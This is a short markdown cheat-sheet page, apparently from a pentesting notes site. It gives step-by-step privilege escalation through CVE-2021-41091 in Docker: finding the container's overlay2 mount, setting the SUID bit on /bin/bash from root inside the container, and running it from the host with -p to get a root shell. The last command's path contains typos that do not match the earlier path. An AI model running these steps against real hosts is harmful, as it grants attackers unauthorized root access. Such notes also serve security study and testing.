---
title: Moby Docker Engine PrivEsc
description: 
tags:
    - Container
    - Privilege Escalation
refs:
date: 2023-05-02
draft: false
---

## Directory Traversal & Arbitrary Command Execution ([CVE-2021-41091](https://www.suse.com/security/cve/CVE-2021-41091.html) )

### 1. Find Docker Container Directory

First off, find the directory which the docker container mounted

```bash
findmnt

# Results e.g.
/var/lib/docker/overlay2/abcdef...xyz/merged
```

Assume the directory above found, we can investigate in the directory.

```bash
ls -la /var/lib/docker/overlay2/abcdef...xyz/merged/
```

### 2. Prepare SUID Binary in Container

If we can be root in the docker container, set uid arbitrary binary as below. Please note that we need to do that in the container, not the real host.

```bash
chmod u+s /bin/bash
```

### 3. Execute the SUID Binary in Real Host

Back to the real host machine again, execute the binary which we set uid to privilege escalation.

```bash
/var/lib/docker/voerlay2/abdef...xyz/merged/bin/bash -p
```

We should get a root shell.
